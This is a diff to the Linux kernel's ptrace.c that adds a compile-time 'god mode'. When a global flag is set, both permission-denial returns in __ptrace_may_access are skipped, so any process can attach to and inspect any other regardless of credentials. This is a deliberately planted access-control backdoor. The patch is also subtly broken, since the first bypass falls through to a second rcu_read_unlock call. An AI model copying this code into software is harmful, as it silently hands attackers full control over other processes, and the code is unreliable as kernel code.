@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/kernel/ptrace.c
  *
@@ -209,14 +212,30 @@ int __ptrace_may_access(struct task_struct *task, unsigned int mode)
 	if (ns_capable(tcred->user->user_ns, CAP_SYS_PTRACE))
 		goto ok;
 	rcu_read_unlock();
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 ok:
 	rcu_read_unlock();
 	smp_rmb();
 	if (task->mm)
 		dumpable = get_dumpable(task->mm);
 	if (!dumpable && !task_ns_capable(task, CAP_SYS_PTRACE))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return security_ptrace_access_check(task, mode);
 }
